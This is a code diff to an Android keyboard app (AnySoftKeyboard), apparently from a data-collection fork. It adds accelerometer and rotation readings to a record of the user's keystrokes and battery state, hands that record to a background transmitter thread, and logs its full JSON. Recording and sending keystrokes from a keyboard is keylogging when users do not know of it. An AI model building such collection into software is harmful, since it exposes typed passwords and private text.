@@ -297,14 +297,9 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
         if (inputView != null) inputView.resetInputView();
 
         //dc-- DataTransmitter
-        Logger.v(TAG, "dc-- DataCollection sensor manager - before");
-//        sensorManager.unregisterListener(this);
 
-        if (sensorListner != null) {
-            sensorListner.stop();
-            sensorListner = null;
-        }
-        Logger.v(TAG, "dc-- DataCollection sensor manager - after");
+
+
         if (dataCollection != null && dataCollection.getKeystrokes().size() > 0) {
             //set battery info and end point for DataCollection object
             BatteryInfo batteryInfo = new BatteryInfo((BatteryManager) getSystemService(Context.BATTERY_SERVICE));
@@ -312,12 +307,19 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardIncognito {
             batteryInfo.setBatterLevel(BatteryInfo.getBatteryLevel(getApplicationContext()));
             dataCollection.setBatteryInfo(batteryInfo);
             dataCollection.setEndPoint();
+            dataCollection.setAcceleration(sensorListner.getAcceleration());
+            dataCollection.setRateOfRotation(sensorListner.getRateOfRotation());
 
             //start the data transmission process
             DataTransmitter transmitter = new DataTransmitter(getApplicationContext(), dataCollection);
             Logger.v(TAG, "dc-- DataCollection JSON =  %s", dataCollection.toJsonString());
             Thread thread = new Thread(transmitter);
             thread.start();
+        }
+
+        if (sensorListner != null) {
+            sensorListner.stop();
+            sensorListner = null;
         }
 
         dataCollection = null;
